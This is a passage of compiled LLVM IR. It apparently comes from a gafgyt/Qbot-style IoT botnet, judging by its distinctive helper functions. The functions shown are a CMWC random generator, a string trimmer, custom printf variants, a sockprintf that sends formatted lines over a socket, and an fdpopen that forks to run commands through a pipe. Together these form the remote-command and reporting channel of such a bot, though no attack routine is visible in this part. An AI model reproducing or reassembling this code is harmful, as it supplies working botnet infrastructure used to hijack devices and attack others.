  %26 = load i32, i32* %3, align 4
  %27 = xor i32 %25, %26
  %28 = load i32, i32* %3, align 4
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %29
  store i32 %27, i32* %30, align 4
  br label %31

31:                                               ; preds = %13
  %32 = load i32, i32* %3, align 4
  %33 = add nsw i32 %32, 1
  store i32 %33, i32* %3, align 4
  br label %10, !llvm.loop !6

34:                                               ; preds = %10
  ret void
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @rand_cmwc() #0 {
  %1 = alloca i64, align 8
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i64 18782, i64* %2, align 8
  store i32 -2, i32* %4, align 4
  %5 = load i32, i32* @rand_cmwc.i, align 4
  %6 = add i32 %5, 1
  %7 = and i32 %6, 4095
  store i32 %7, i32* @rand_cmwc.i, align 4
  %8 = load i64, i64* %2, align 8
  %9 = load i32, i32* @rand_cmwc.i, align 4
  %10 = zext i32 %9 to i64
  %11 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %10
  %12 = load i32, i32* %11, align 4
  %13 = zext i32 %12 to i64
  %14 = mul i64 %8, %13
  %15 = load i32, i32* @c, align 4
  %16 = zext i32 %15 to i64
  %17 = add i64 %14, %16
  store i64 %17, i64* %1, align 8
  %18 = load i64, i64* %1, align 8
  %19 = lshr i64 %18, 32
  %20 = trunc i64 %19 to i32
  store i32 %20, i32* @c, align 4
  %21 = load i64, i64* %1, align 8
  %22 = load i32, i32* @c, align 4
  %23 = zext i32 %22 to i64
  %24 = add i64 %21, %23
  %25 = trunc i64 %24 to i32
  store i32 %25, i32* %3, align 4
  %26 = load i32, i32* %3, align 4
  %27 = load i32, i32* @c, align 4
  %28 = icmp ult i32 %26, %27
  br i1 %28, label %29, label %34

29:                                               ; preds = %0
  %30 = load i32, i32* %3, align 4
  %31 = add i32 %30, 1
  store i32 %31, i32* %3, align 4
  %32 = load i32, i32* @c, align 4
  %33 = add i32 %32, 1
  store i32 %33, i32* @c, align 4
  br label %34

34:                                               ; preds = %29, %0
  %35 = load i32, i32* %4, align 4
  %36 = load i32, i32* %3, align 4
  %37 = sub i32 %35, %36
  %38 = load i32, i32* @rand_cmwc.i, align 4
  %39 = zext i32 %38 to i64
  %40 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %39
  store i32 %37, i32* %40, align 4
  ret i32 %37
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @trim(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #11
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  br label %10

10:                                               ; preds = %19, %1
  %11 = load i8*, i8** %2, align 8
  %12 = load i32, i32* %4, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds i8, i8* %11, i64 %13
  %15 = load i8, i8* %14, align 1
  %16 = sext i8 %15 to i32
  %17 = call i32 @isspace(i32 %16) #11
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %22

19:                                               ; preds = %10
  %20 = load i32, i32* %4, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %4, align 4
  br label %10, !llvm.loop !8

22:                                               ; preds = %10
  br label %23

23:                                               ; preds = %38, %22
  %24 = load i32, i32* %5, align 4
  %25 = load i32, i32* %4, align 4
  %26 = icmp sge i32 %24, %25
  br i1 %26, label %27, label %36

27:                                               ; preds = %23
  %28 = load i8*, i8** %2, align 8
  %29 = load i32, i32* %5, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i8, i8* %28, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = sext i8 %32 to i32
  %34 = call i32 @isspace(i32 %33) #11
  %35 = icmp ne i32 %34, 0
  br label %36

36:                                               ; preds = %27, %23
  %37 = phi i1 [ false, %23 ], [ %35, %27 ]
  br i1 %37, label %38, label %41

38:                                               ; preds = %36
  %39 = load i32, i32* %5, align 4
  %40 = add nsw i32 %39, -1
  store i32 %40, i32* %5, align 4
  br label %23, !llvm.loop !9

41:                                               ; preds = %36
  %42 = load i32, i32* %4, align 4
  store i32 %42, i32* %3, align 4
  br label %43

43:                                               ; preds = %59, %41
  %44 = load i32, i32* %3, align 4
  %45 = load i32, i32* %5, align 4
  %46 = icmp sle i32 %44, %45
  br i1 %46, label %47, label %62

47:                                               ; preds = %43
  %48 = load i8*, i8** %2, align 8
  %49 = load i32, i32* %3, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds i8, i8* %48, i64 %50
  %52 = load i8, i8* %51, align 1
  %53 = load i8*, i8** %2, align 8
  %54 = load i32, i32* %3, align 4
  %55 = load i32, i32* %4, align 4
  %56 = sub nsw i32 %54, %55
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds i8, i8* %53, i64 %57
  store i8 %52, i8* %58, align 1
  br label %59

59:                                               ; preds = %47
  %60 = load i32, i32* %3, align 4
  %61 = add nsw i32 %60, 1
  store i32 %61, i32* %3, align 4
  br label %43, !llvm.loop !10

62:                                               ; preds = %43
  %63 = load i8*, i8** %2, align 8
  %64 = load i32, i32* %3, align 4
  %65 = load i32, i32* %4, align 4
  %66 = sub nsw i32 %64, %65
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds i8, i8* %63, i64 %67
  store i8 0, i8* %68, align 1
  ret void
}

; Function Attrs: nounwind readonly willreturn
declare i64 @strlen(i8*) #1

; Function Attrs: nounwind readonly willreturn
declare i32 @isspace(i32) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @zprintf(i8* %0, ...) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %2, align 8
  %4 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i64 0, i64 0
  %5 = bitcast %struct.__va_list_tag* %4 to i8*
  call void @llvm.va_start(i8* %5)
  %6 = load i8*, i8** %2, align 8
  %7 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i64 0, i64 0
  %8 = call i32 @print(i8** null, i8* %6, %struct.__va_list_tag* %7)
  ret i32 %8
}

; Function Attrs: nofree nosync nounwind willreturn
declare void @llvm.va_start(i8*) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal i32 @print(i8** %0, i8* %1, %struct.__va_list_tag* %2) #0 {
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.__va_list_tag*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [2 x i8], align 1
  %11 = alloca i8*, align 8
  store i8** %0, i8*** %4, align 8
  store i8* %1, i8** %5, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %6, align 8
  store i32 0, i32* %9, align 4
  br label %12

12:                                               ; preds = %282, %3
  %13 = load i8*, i8** %5, align 8
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = icmp ne i32 %15, 0
  br i1 %16, label %17, label %285

17:                                               ; preds = %12
  %18 = load i8*, i8** %5, align 8
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 %20, 37
  br i1 %21, label %22, label %273

22:                                               ; preds = %17
  %23 = load i8*, i8** %5, align 8
  %24 = getelementptr inbounds i8, i8* %23, i32 1
  store i8* %24, i8** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %7, align 4
  %25 = load i8*, i8** %5, align 8
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 %27, 0
  br i1 %28, label %29, label %30

29:                                               ; preds = %22
  br label %285

30:                                               ; preds = %22
  %31 = load i8*, i8** %5, align 8
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i32
  %34 = icmp eq i32 %33, 37
  br i1 %34, label %35, label %36

35:                                               ; preds = %30
  br label %274

36:                                               ; preds = %30
  %37 = load i8*, i8** %5, align 8
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 %39, 45
  br i1 %40, label %41, label %44

41:                                               ; preds = %36
  %42 = load i8*, i8** %5, align 8
  %43 = getelementptr inbounds i8, i8* %42, i32 1
  store i8* %43, i8** %5, align 8
  store i32 1, i32* %8, align 4
  br label %44

44:                                               ; preds = %41, %36
  br label %45

45:                                               ; preds = %50, %44
  %46 = load i8*, i8** %5, align 8
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 48
  br i1 %49, label %50, label %55

50:                                               ; preds = %45
  %51 = load i8*, i8** %5, align 8
  %52 = getelementptr inbounds i8, i8* %51, i32 1
  store i8* %52, i8** %5, align 8
  %53 = load i32, i32* %8, align 4
  %54 = or i32 %53, 2
  store i32 %54, i32* %8, align 4
  br label %45, !llvm.loop !11

55:                                               ; preds = %45
  br label %56

56:                                               ; preds = %77, %55
  %57 = load i8*, i8** %5, align 8
  %58 = load i8, i8* %57, align 1
  %59 = zext i8 %58 to i32
  %60 = icmp sge i32 %59, 48
  br i1 %60, label %61, label %66

61:                                               ; preds = %56
  %62 = load i8*, i8** %5, align 8
  %63 = load i8, i8* %62, align 1
  %64 = zext i8 %63 to i32
  %65 = icmp sle i32 %64, 57
  br label %66

66:                                               ; preds = %61, %56
  %67 = phi i1 [ false, %56 ], [ %65, %61 ]
  br i1 %67, label %68, label %80

68:                                               ; preds = %66
  %69 = load i32, i32* %7, align 4
  %70 = mul nsw i32 %69, 10
  store i32 %70, i32* %7, align 4
  %71 = load i8*, i8** %5, align 8
  %72 = load i8, i8* %71, align 1
  %73 = zext i8 %72 to i32
  %74 = sub nsw i32 %73, 48
  %75 = load i32, i32* %7, align 4
  %76 = add nsw i32 %75, %74
  store i32 %76, i32* %7, align 4
  br label %77

77:                                               ; preds = %68
  %78 = load i8*, i8** %5, align 8
  %79 = getelementptr inbounds i8, i8* %78, i32 1
  store i8* %79, i8** %5, align 8
  br label %56, !llvm.loop !12

80:                                               ; preds = %66
  %81 = load i8*, i8** %5, align 8
  %82 = load i8, i8* %81, align 1
  %83 = zext i8 %82 to i32
  %84 = icmp eq i32 %83, 115
  br i1 %84, label %85, label %118

85:                                               ; preds = %80
  %86 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %87 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %86, i32 0, i32 0
  %88 = load i32, i32* %87, align 8
  %89 = icmp ule i32 %88, 40
  br i1 %89, label %90, label %96

90:                                               ; preds = %85
  %91 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %86, i32 0, i32 3
  %92 = load i8*, i8** %91, align 8
  %93 = getelementptr i8, i8* %92, i32 %88
  %94 = bitcast i8* %93 to i64*
  %95 = add i32 %88, 8
  store i32 %95, i32* %87, align 8
  br label %101

96:                                               ; preds = %85
  %97 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %86, i32 0, i32 2
  %98 = load i8*, i8** %97, align 8
  %99 = bitcast i8* %98 to i64*
  %100 = getelementptr i8, i8* %98, i32 8
  store i8* %100, i8** %97, align 8
  br label %101

101:                                              ; preds = %96, %90
  %102 = phi i64* [ %94, %90 ], [ %99, %96 ]
  %103 = load i64, i64* %102, align 8
  %104 = inttoptr i64 %103 to i8*
  store i8* %104, i8** %11, align 8
  %105 = load i8**, i8*** %4, align 8
  %106 = load i8*, i8** %11, align 8
  %107 = icmp ne i8* %106, null
  br i1 %107, label %108, label %110

108:                                              ; preds = %101
  %109 = load i8*, i8** %11, align 8
  br label %111

110:                                              ; preds = %101
  br label %111

111:                                              ; preds = %110, %108
  %112 = phi i8* [ %109, %108 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @.str.147, i64 0, i64 0), %110 ]
  %113 = load i32, i32* %7, align 4
  %114 = load i32, i32* %8, align 4
  %115 = call i32 @prints(i8** %105, i8* %112, i32 %113, i32 %114)
  %116 = load i32, i32* %9, align 4
  %117 = add nsw i32 %116, %115
  store i32 %117, i32* %9, align 4
  br label %282

118:                                              ; preds = %80
  %119 = load i8*, i8** %5, align 8
  %120 = load i8, i8* %119, align 1
  %121 = zext i8 %120 to i32
  %122 = icmp eq i32 %121, 100
  br i1 %122, label %123, label %148

123:                                              ; preds = %118
  %124 = load i8**, i8*** %4, align 8
  %125 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %126 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %125, i32 0, i32 0
  %127 = load i32, i32* %126, align 8
  %128 = icmp ule i32 %127, 40
  br i1 %128, label %129, label %135

129:                                              ; preds = %123
  %130 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %125, i32 0, i32 3
  %131 = load i8*, i8** %130, align 8
  %132 = getelementptr i8, i8* %131, i32 %127
  %133 = bitcast i8* %132 to i32*
  %134 = add i32 %127, 8
  store i32 %134, i32* %126, align 8
  br label %140

135:                                              ; preds = %123
  %136 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %125, i32 0, i32 2
  %137 = load i8*, i8** %136, align 8
  %138 = bitcast i8* %137 to i32*
  %139 = getelementptr i8, i8* %137, i32 8
  store i8* %139, i8** %136, align 8
  br label %140

140:                                              ; preds = %135, %129
  %141 = phi i32* [ %133, %129 ], [ %138, %135 ]
  %142 = load i32, i32* %141, align 4
  %143 = load i32, i32* %7, align 4
  %144 = load i32, i32* %8, align 4
  %145 = call i32 @printi(i8** %124, i32 %142, i32 10, i32 1, i32 %143, i32 %144, i32 97)
  %146 = load i32, i32* %9, align 4
  %147 = add nsw i32 %146, %145
  store i32 %147, i32* %9, align 4
  br label %282

148:                                              ; preds = %118
  %149 = load i8*, i8** %5, align 8
  %150 = load i8, i8* %149, align 1
  %151 = zext i8 %150 to i32
  %152 = icmp eq i32 %151, 120
  br i1 %152, label %153, label %178

153:                                              ; preds = %148
  %154 = load i8**, i8*** %4, align 8
  %155 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %156 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %155, i32 0, i32 0
  %157 = load i32, i32* %156, align 8
  %158 = icmp ule i32 %157, 40
  br i1 %158, label %159, label %165

159:                                              ; preds = %153
  %160 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %155, i32 0, i32 3
  %161 = load i8*, i8** %160, align 8
  %162 = getelementptr i8, i8* %161, i32 %157
  %163 = bitcast i8* %162 to i32*
  %164 = add i32 %157, 8
  store i32 %164, i32* %156, align 8
  br label %170

165:                                              ; preds = %153
  %166 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %155, i32 0, i32 2
  %167 = load i8*, i8** %166, align 8
  %168 = bitcast i8* %167 to i32*
  %169 = getelementptr i8, i8* %167, i32 8
  store i8* %169, i8** %166, align 8
  br label %170

170:                                              ; preds = %165, %159
  %171 = phi i32* [ %163, %159 ], [ %168, %165 ]
  %172 = load i32, i32* %171, align 4
  %173 = load i32, i32* %7, align 4
  %174 = load i32, i32* %8, align 4
  %175 = call i32 @printi(i8** %154, i32 %172, i32 16, i32 0, i32 %173, i32 %174, i32 97)
  %176 = load i32, i32* %9, align 4
  %177 = add nsw i32 %176, %175
  store i32 %177, i32* %9, align 4
  br label %282

178:                                              ; preds = %148
  %179 = load i8*, i8** %5, align 8
  %180 = load i8, i8* %179, align 1
  %181 = zext i8 %180 to i32
  %182 = icmp eq i32 %181, 88
  br i1 %182, label %183, label %208

183:                                              ; preds = %178
  %184 = load i8**, i8*** %4, align 8
  %185 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %186 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %185, i32 0, i32 0
  %187 = load i32, i32* %186, align 8
  %188 = icmp ule i32 %187, 40
  br i1 %188, label %189, label %195

189:                                              ; preds = %183
  %190 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %185, i32 0, i32 3
  %191 = load i8*, i8** %190, align 8
  %192 = getelementptr i8, i8* %191, i32 %187
  %193 = bitcast i8* %192 to i32*
  %194 = add i32 %187, 8
  store i32 %194, i32* %186, align 8
  br label %200

195:                                              ; preds = %183
  %196 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %185, i32 0, i32 2
  %197 = load i8*, i8** %196, align 8
  %198 = bitcast i8* %197 to i32*
  %199 = getelementptr i8, i8* %197, i32 8
  store i8* %199, i8** %196, align 8
  br label %200

200:                                              ; preds = %195, %189
  %201 = phi i32* [ %193, %189 ], [ %198, %195 ]
  %202 = load i32, i32* %201, align 4
  %203 = load i32, i32* %7, align 4
  %204 = load i32, i32* %8, align 4
  %205 = call i32 @printi(i8** %184, i32 %202, i32 16, i32 0, i32 %203, i32 %204, i32 65)
  %206 = load i32, i32* %9, align 4
  %207 = add nsw i32 %206, %205
  store i32 %207, i32* %9, align 4
  br label %282

208:                                              ; preds = %178
  %209 = load i8*, i8** %5, align 8
  %210 = load i8, i8* %209, align 1
  %211 = zext i8 %210 to i32
  %212 = icmp eq i32 %211, 117
  br i1 %212, label %213, label %238

213:                                              ; preds = %208
  %214 = load i8**, i8*** %4, align 8
  %215 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %216 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %215, i32 0, i32 0
  %217 = load i32, i32* %216, align 8
  %218 = icmp ule i32 %217, 40
  br i1 %218, label %219, label %225

219:                                              ; preds = %213
  %220 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %215, i32 0, i32 3
  %221 = load i8*, i8** %220, align 8
  %222 = getelementptr i8, i8* %221, i32 %217
  %223 = bitcast i8* %222 to i32*
  %224 = add i32 %217, 8
  store i32 %224, i32* %216, align 8
  br label %230

225:                                              ; preds = %213
  %226 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %215, i32 0, i32 2
  %227 = load i8*, i8** %226, align 8
  %228 = bitcast i8* %227 to i32*
  %229 = getelementptr i8, i8* %227, i32 8
  store i8* %229, i8** %226, align 8
  br label %230

230:                                              ; preds = %225, %219
  %231 = phi i32* [ %223, %219 ], [ %228, %225 ]
  %232 = load i32, i32* %231, align 4
  %233 = load i32, i32* %7, align 4
  %234 = load i32, i32* %8, align 4
  %235 = call i32 @printi(i8** %214, i32 %232, i32 10, i32 0, i32 %233, i32 %234, i32 97)
  %236 = load i32, i32* %9, align 4
  %237 = add nsw i32 %236, %235
  store i32 %237, i32* %9, align 4
  br label %282

238:                                              ; preds = %208
  %239 = load i8*, i8** %5, align 8
  %240 = load i8, i8* %239, align 1
  %241 = zext i8 %240 to i32
  %242 = icmp eq i32 %241, 99
  br i1 %242, label %243, label %272

243:                                              ; preds = %238
  %244 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %245 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %244, i32 0, i32 0
  %246 = load i32, i32* %245, align 8
  %247 = icmp ule i32 %246, 40
  br i1 %247, label %248, label %254

248:                                              ; preds = %243
  %249 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %244, i32 0, i32 3
  %250 = load i8*, i8** %249, align 8
  %251 = getelementptr i8, i8* %250, i32 %246
  %252 = bitcast i8* %251 to i32*
  %253 = add i32 %246, 8
  store i32 %253, i32* %245, align 8
  br label %259

254:                                              ; preds = %243
  %255 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %244, i32 0, i32 2
  %256 = load i8*, i8** %255, align 8
  %257 = bitcast i8* %256 to i32*
  %258 = getelementptr i8, i8* %256, i32 8
  store i8* %258, i8** %255, align 8
  br label %259

259:                                              ; preds = %254, %248
  %260 = phi i32* [ %252, %248 ], [ %257, %254 ]
  %261 = load i32, i32* %260, align 4
  %262 = trunc i32 %261 to i8
  %263 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %262, i8* %263, align 1
  %264 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %264, align 1
  %265 = load i8**, i8*** %4, align 8
  %266 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  %267 = load i32, i32* %7, align 4
  %268 = load i32, i32* %8, align 4
  %269 = call i32 @prints(i8** %265, i8* %266, i32 %267, i32 %268)
  %270 = load i32, i32* %9, align 4
  %271 = add nsw i32 %270, %269
  store i32 %271, i32* %9, align 4
  br label %282

272:                                              ; preds = %238
  br label %281

273:                                              ; preds = %17
  br label %274

274:                                              ; preds = %273, %35
  %275 = load i8**, i8*** %4, align 8
  %276 = load i8*, i8** %5, align 8
  %277 = load i8, i8* %276, align 1
  %278 = zext i8 %277 to i32
  call void @printchar(i8** %275, i32 %278)
  %279 = load i32, i32* %9, align 4
  %280 = add nsw i32 %279, 1
  store i32 %280, i32* %9, align 4
  br label %281

281:                                              ; preds = %274, %272
  br label %282

282:                                              ; preds = %281, %259, %230, %200, %170, %140, %111
  %283 = load i8*, i8** %5, align 8
  %284 = getelementptr inbounds i8, i8* %283, i32 1
  store i8* %284, i8** %5, align 8
  br label %12, !llvm.loop !13

285:                                              ; preds = %29, %12
  %286 = load i8**, i8*** %4, align 8
  %287 = icmp ne i8** %286, null
  br i1 %287, label %288, label %291

288:                                              ; preds = %285
  %289 = load i8**, i8*** %4, align 8
  %290 = load i8*, i8** %289, align 8
  store i8 0, i8* %290, align 1
  br label %291

291:                                              ; preds = %288, %285
  %292 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %293 = bitcast %struct.__va_list_tag* %292 to i8*
  call void @llvm.va_end(i8* %293)
  %294 = load i32, i32* %9, align 4
  ret i32 %294
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @szprintf(i8* %0, i8* %1, ...) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i64 0, i64 0
  %7 = bitcast %struct.__va_list_tag* %6 to i8*
  call void @llvm.va_start(i8* %7)
  %8 = load i8*, i8** %4, align 8
  %9 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i64 0, i64 0
  %10 = call i32 @print(i8** %3, i8* %8, %struct.__va_list_tag* %9)
  ret i32 %10
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @sockprintf(i32 %0, i8* %1, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [1 x %struct.__va_list_tag], align 16
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8* %1, i8** %4, align 8
  %9 = call noalias align 16 i8* @malloc(i64 2048) #12
  store i8* %9, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %10, i8 0, i64 2048, i1 false)
  %11 = load i8*, i8** %5, align 8
  store i8* %11, i8** %6, align 8
  %12 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i64 0, i64 0
  %13 = bitcast %struct.__va_list_tag* %12 to i8*
  call void @llvm.va_start(i8* %13)
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i64 0, i64 0
  %16 = call i32 @print(i8** %5, i8* %14, %struct.__va_list_tag* %15)
  %17 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i64 0, i64 0
  %18 = bitcast %struct.__va_list_tag* %17 to i8*
  call void @llvm.va_end(i8* %18)
  %19 = load i8*, i8** %6, align 8
  %20 = load i8*, i8** %6, align 8
  %21 = call i64 @strlen(i8* %20) #11
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  store i8 10, i8* %22, align 1
  %23 = load i32, i32* %3, align 4
  %24 = load i8*, i8** %6, align 8
  %25 = load i8*, i8** %6, align 8
  %26 = call i64 @strlen(i8* %25) #11
  %27 = call i64 @send(i32 %23, i8* %24, i64 %26, i32 16384)
  %28 = trunc i64 %27 to i32
  store i32 %28, i32* %8, align 4
  %29 = load i8*, i8** %6, align 8
  call void @free(i8* %29) #12
  %30 = load i32, i32* %8, align 4
  ret i32 %30
}

; Function Attrs: nounwind
declare noalias align 16 i8* @malloc(i64) #3

; Function Attrs: argmemonly nofree nounwind willreturn writeonly
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #4

; Function Attrs: nofree nosync nounwind willreturn
declare void @llvm.va_end(i8*) #2

declare i64 @send(i32, i8*, i64, i32) #5

; Function Attrs: nounwind
declare void @free(i8*) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @fdpopen(i8* %0, i8* %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca [2 x i32], align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  %13 = icmp ne i32 %12, 114
  br i1 %13, label %14, label %19

14:                                               ; preds = %2
  %15 = load i8*, i8** %5, align 8
  %16 = load i8, i8* %15, align 1
  %17 = zext i8 %16 to i32
  %18 = icmp ne i32 %17, 119
  br i1 %18, label %25, label %19

19:                                               ; preds = %14, %2
  %20 = load i8*, i8** %5, align 8
  %21 = getelementptr inbounds i8, i8* %20, i64 1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 0
  br i1 %24, label %25, label %26

25:                                               ; preds = %19, %14
  store i32 -1, i32* %3, align 4
  br label %125

26:                                               ; preds = %19
  %27 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %28 = call i32 @pipe(i32* %27) #12
  %29 = icmp slt i32 %28, 0
  br i1 %29, label %30, label %31

30:                                               ; preds = %26
  store i32 -1, i32* %3, align 4
  br label %125

31:                                               ; preds = %26
  %32 = load i32*, i32** @fdopen_pids, align 8
  %33 = icmp eq i32* %32, null
  br i1 %33, label %34, label %54

34:                                               ; preds = %31
  %35 = call i32 @getdtablesize() #12
  store i32 %35, i32* %8, align 4
  %36 = icmp sle i32 %35, 0
  br i1 %36, label %37, label %38

37:                                               ; preds = %34
  store i32 -1, i32* %3, align 4
  br label %125

38:                                               ; preds = %34
  %39 = load i32, i32* %8, align 4
  %40 = sext i32 %39 to i64
  %41 = mul i64 %40, 4
  %42 = trunc i64 %41 to i32
  %43 = zext i32 %42 to i64
  %44 = call noalias align 16 i8* @malloc(i64 %43) #12
  %45 = bitcast i8* %44 to i32*
  store i32* %45, i32** @fdopen_pids, align 8
  %46 = icmp eq i32* %45, null
  br i1 %46, label %47, label %48

47:                                               ; preds = %38
  store i32 -1, i32* %3, align 4
  br label %125

48:                                               ; preds = %38
  %49 = load i32*, i32** @fdopen_pids, align 8
  %50 = bitcast i32* %49 to i8*
  %51 = load i32, i32* %8, align 4
  %52 = sext i32 %51 to i64
  %53 = mul i64 %52, 4
  call void @llvm.memset.p0i8.i64(i8* align 1 %50, i8 0, i64 %53, i1 false)
  br label %54

54:                                               ; preds = %48, %31
  %55 = call i32 @vfork() #13
  store i32 %55, i32* %9, align 4
  switch i32 %55, label %101 [
    i32 -1, label %56
    i32 0, label %63
  ]

56:                                               ; preds = %54
  %57 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %58 = load i32, i32* %57, align 4
  %59 = call i32 @close(i32 %58)
  %60 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %61 = load i32, i32* %60, align 4
  %62 = call i32 @close(i32 %61)
  store i32 -1, i32* %3, align 4
  br label %125

63:                                               ; preds = %54
  %64 = load i8*, i8** %5, align 8
  %65 = load i8, i8* %64, align 1
  %66 = zext i8 %65 to i32
  %67 = icmp eq i32 %66, 114
  br i1 %67, label %68, label %83

68:                                               ; preds = %63
  %69 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %70 = load i32, i32* %69, align 4
  %71 = icmp ne i32 %70, 1
  br i1 %71, label %72, label %79

72:                                               ; preds = %68
  %73 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %74 = load i32, i32* %73, align 4
  %75 = call i32 @dup2(i32 %74, i32 1) #12
  %76 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %77 = load i32, i32* %76, align 4
  %78 = call i32 @close(i32 %77)
  br label %79

79:                                               ; preds = %72, %68
  %80 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %81 = load i32, i32* %80, align 4
  %82 = call i32 @close(i32 %81)
  br label %98

83:                                               ; preds = %63
